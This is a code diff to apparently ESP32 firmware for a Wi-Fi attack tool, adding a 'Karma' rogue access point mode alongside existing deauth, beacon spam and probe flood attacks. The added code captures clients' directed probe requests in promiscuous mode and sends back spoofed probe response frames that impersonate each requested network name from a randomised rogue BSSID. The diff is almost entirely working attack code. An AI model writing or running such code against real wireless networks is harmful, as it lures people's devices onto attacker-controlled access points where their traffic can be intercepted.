@@ -249,6 +249,51 @@ static uint16_t buildProbeFrame(uint8_t* frame, const char* ssid, const uint8_t*
     return pos;
 }
 
+// G4 — Build a probe RESPONSE answering a directed probe request.
+// DA = probing client, SA/BSSID = our attack AP MAC. Clean-room frame.
+static uint16_t buildProbeResponseFrame(uint8_t* frame, const uint8_t* clientMac,
+                                        const char* ssid, uint8_t ssidLen,
+                                        uint8_t channel, const uint8_t* apMac) {
+    size_t pos = 0;
+    if (ssidLen > 32) ssidLen = 32;
+
+    frame[pos++] = 0x50;  // FC: management, probe response
+    frame[pos++] = 0x00;
+    frame[pos++] = 0x00;  // Duration
+    frame[pos++] = 0x00;
+    memcpy(&frame[pos], clientMac, 6); pos += 6;  // DA: probing client
+    memcpy(&frame[pos], apMac, 6);     pos += 6;  // SA: our AP
+    memcpy(&frame[pos], apMac, 6);     pos += 6;  // BSSID: our AP
+    static uint16_t seq = 0;
+    seq = (seq + 1) & 0x0FFF;
+    frame[pos++] = (seq >> 4) & 0xFF;
+    frame[pos++] = ((seq & 0x0F) << 4);
+    memset(&frame[pos], 0x00, 8); pos += 8;       // Timestamp
+    frame[pos++] = 0x64; frame[pos++] = 0x00;     // Beacon interval (100 TU)
+    frame[pos++] = 0x11; frame[pos++] = 0x00;     // Capability: ESS
+    frame[pos++] = 0x00; frame[pos++] = ssidLen;  // SSID IE
+    if (ssidLen) { memcpy(&frame[pos], ssid, ssidLen); pos += ssidLen; }
+    static const uint8_t kRates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
+    memcpy(&frame[pos], kRates, sizeof(kRates)); pos += sizeof(kRates);
+    frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = channel;  // DS param
+    return (uint16_t)pos;
+}
+
+// G4 — Karma probe intake ring. Written from the promiscuous RX path
+// (via PACKETLABKarmaIngestProbe), drained by PACKETLABAttackTick in loop().
+// Static, no heap; guarded by a spinlock-style mux, never blocks RX.
+static constexpr int KARMA_RING_SIZE = 8;
+struct KarmaProbe {
+    uint8_t clientMac[6];
+    char ssid[33];
+    bool pending;
+};
+static KarmaProbe karmaRing[KARMA_RING_SIZE] = {};
+static uint8_t karmaRingHead = 0;
+static portMUX_TYPE karmaMux = portMUX_INITIALIZER_UNLOCKED;
+static uint32_t karmaProbesSeen = 0;
+static uint32_t karmaResponsesSent = 0;
+
 // Start a hidden AP on the given channel for injection
 static bool startAttackAP(uint8_t channel) {
     WiFi.mode(WIFI_AP);
@@ -423,6 +468,63 @@ void PACKETLABStartDeauthBroadcast(uint8_t channel, uint16_t durationMs) {
     xSemaphoreGive(attackMutex);
 }
 
+// G4 — Karma: rogue-AP answers to directed probe requests.
+void PACKETLABStartKarma(uint8_t channel, uint16_t durationMs) {
+    if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
+        logError("Attack mutex timeout");
+        return;
+    }
+
+    stopAttackLocked();
+
+    generateRandomMAC(gTarget.bssid);  // our rogue AP identity
+    strncpy(gTarget.ssid, "karma", 23);
+    gTarget.channel = channel;
+
+    if (!startAttackAP(channel)) {
+        logError("Failed to start attack AP");
+        xSemaphoreGive(attackMutex);
+        return;
+    }
+
+    portENTER_CRITICAL(&karmaMux);
+    for (int i = 0; i < KARMA_RING_SIZE; i++) karmaRing[i].pending = false;
+    karmaRingHead = 0;
+    karmaProbesSeen = 0;
+    karmaResponsesSent = 0;
+    portEXIT_CRITICAL(&karmaMux);
+
+    gCurrentAttack = PACKETLABAttackType::KARMA;
+    gAttackStartMs = millis();
+    gAttackDurationMs = durationMs;
+    gAttackActive = true;
+    memset(&gStats, 0, sizeof(gStats));
+    gStats.startTimeMs = gAttackStartMs;
+
+    logInfo("Karma started on CH%d for %dms (rogue BSSID %s)",
+            channel, durationMs, PACKETLABFormatMAC(gTarget.bssid).c_str());
+
+    xSemaphoreGive(attackMutex);
+}
+
+// RX-context entry: copy only, no TX, no heap, no logging.
+void PACKETLABKarmaIngestProbe(const uint8_t* clientMac, const char* ssid, uint8_t ssidLen) {
+    if (!gAttackActive || gCurrentAttack != PACKETLABAttackType::KARMA) return;
+    if (!clientMac || !ssid || ssidLen == 0 || ssidLen > 32) return;
+    portENTER_CRITICAL_ISR(&karmaMux);
+    KarmaProbe& slot = karmaRing[karmaRingHead];
+    memcpy(slot.clientMac, clientMac, 6);
+    memcpy(slot.ssid, ssid, ssidLen);
+    slot.ssid[ssidLen] = '\0';
+    slot.pending = true;
+    karmaRingHead = (uint8_t)((karmaRingHead + 1) % KARMA_RING_SIZE);
+    karmaProbesSeen++;
+    portEXIT_CRITICAL_ISR(&karmaMux);
+}
+
+uint32_t PACKETLABKarmaResponsesSent() { return karmaResponsesSent; }
+uint32_t PACKETLABKarmaProbesSeen() { return karmaProbesSeen; }
+
 void PACKETLABStopAttack() {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         return;
@@ -445,6 +547,8 @@ const char* PACKETLABGetAttackName() {
             return "Beacon Spam";
         case PACKETLABAttackType::PROBE_FLOOD:
             return "Probe Flood";
+        case PACKETLABAttackType::KARMA:
+            return "Karma";
         default:
             return "Idle";
     }
@@ -566,6 +670,41 @@ void PACKETLABAttackTick() {
                 sendRawFrame(frame, frameLen);
                 gStats.framesSent++;
                 gStats.packetsSent++;
+            }
+            break;
+        }
+
+        case PACKETLABAttackType::KARMA: {
+            // G4 — drain the probe-intake ring: one spoofed probe response
+            // per tick (rate-limited), impersonating each probed SSID.
+            // Never blocks: if the ring is momentarily contended we retry
+            // next tick rather than stalling the attack loop.
+            bool haveWork = false;
+            uint8_t clientMac[6];
+            char ssid[33];
+            uint8_t ssidLen = 0;
+            portENTER_CRITICAL(&karmaMux);
+            for (int i = 0; i < KARMA_RING_SIZE; i++) {
+                if (karmaRing[i].pending) {
+                    memcpy(clientMac, karmaRing[i].clientMac, 6);
+                    ssidLen = (uint8_t)strnlen(karmaRing[i].ssid, 32);
+                    memcpy(ssid, karmaRing[i].ssid, ssidLen);
+                    ssid[ssidLen] = '\0';
+                    karmaRing[i].pending = false;
+                    haveWork = true;
+                    break;
+                }
+            }
+            portEXIT_CRITICAL(&karmaMux);
+            if (haveWork && millis() - lastSend > 50) {
+                lastSend = millis();
+                frameLen = buildProbeResponseFrame(frame, clientMac, ssid, ssidLen,
+                                                  gTarget.channel, gTarget.bssid);
+                if (sendRawFrame(frame, frameLen) == ESP_OK) {
+                    karmaResponsesSent++;
+                    gStats.framesSent++;
+                    gStats.packetsSent++;
+                }
             }
             break;
         }
